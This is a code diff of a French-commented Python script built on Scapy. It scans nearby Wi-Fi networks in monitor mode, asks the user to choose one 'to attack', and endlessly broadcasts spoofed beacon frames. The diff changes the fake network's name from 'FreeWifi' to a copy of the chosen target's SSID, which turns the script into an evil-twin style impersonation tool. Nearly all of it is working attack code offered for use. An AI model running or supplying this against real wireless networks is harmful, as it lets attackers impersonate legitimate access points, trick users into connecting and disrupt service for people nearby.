@@ -1,15 +1,22 @@
 from scapy.all import *
+from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt
+from scapy.layers.dot11 import RadioTap
+from scapy.sendrecv import sniff, sendp
 
-# Fonction pour extraire les informations d'un paquet Beacon
+
 def extract_beacon_info(packet):
-    if packet.haslayer(Dot11Beacon):
-        ssid = packet[Dot11Elt].info.decode()
-        bssid = packet[Dot11].addr3
-        channel = int(ord(packet[Dot11Elt:3].info))
-        power = packet.dBm_AntSignal
-        return (ssid, bssid, channel, power)
-    else:
+    try:
+        if packet.haslayer(Dot11Beacon):
+            ssid = packet[Dot11Elt].info.decode()
+            bssid = packet[Dot11].addr3
+            channel = int(ord(packet[Dot11Elt:3].info))
+            power = packet.dBm_AntSignal
+            return (ssid, bssid, channel, power)
+        else:
+            return None
+    except:
         return None
+
 
 # Fonction pour scanner les réseaux environnants
 def scan_networks():
@@ -21,12 +28,13 @@ def scan_networks():
         conf.iface = "wlan0mon"
         conf.channel = str(channel)
         # Capture des paquets pendant 0,5 seconde sur chaque canal
-        packets = sniff(timeout=0.5)
+        packets = sniff(timeout=1)
         # Extraction des informations des paquets Beacon
         for packet in packets:
             network = extract_beacon_info(packet)
             if network and network not in networks:
                 networks.append(network)
+    
     return networks
 
 # Fonction pour afficher les réseaux découverts
@@ -49,7 +57,7 @@ def choose_network(networks):
 # Fonction pour générer un beacon concurrent annonçant un faux réseau
 def generate_fake_network(network):
     ssid, bssid, channel, power = network
-    fake_ssid = "FreeWifi" # Nom du faux réseau
+    fake_ssid = ssid # Nom du faux réseau
     fake_bssid = RandMAC() # Adresse MAC aléatoire pour le faux BSSID
     fake_channel = (channel + 6) % 14 + 1 # Canal 6 canaux plus loin
     # Configuration du canal pour l'envoi du faux paquet
@@ -58,10 +66,21 @@ def generate_fake_network(network):
     # Génération du paquet Beacon
     packet = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fake_bssid, addr3=fake_bssid) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info=fake_ssid, len=len(fake_ssid))
     # Envoi du paquet en boucle
-    sendp(packet, inter=0.1, loop=1)
+    sendp(packet, inter=0.1, iface="wlan0mon", loop=1)
     print(f"Un faux réseau ({fake_ssid}) a été généré sur le canal {fake_channel} ({conf.channel}).")
 
-# Fonction principale
 def main():
-    # Scan des réseaux environnants
-    networks = scan
+    # Scanner les réseaux disponibles
+    networks = scan_networks()
+    # Afficher la liste des réseaux découverts
+    print_networks(networks)
+    # Permettre à l'utilisateur de choisir un réseau à attaquer
+    selected_network = choose_network(networks)
+    # Générer un beacon concurrent annonçant un faux réseau
+    generate_fake_network(selected_network)
+
+if __name__ == "__main__":
+    main()
+
+
+    
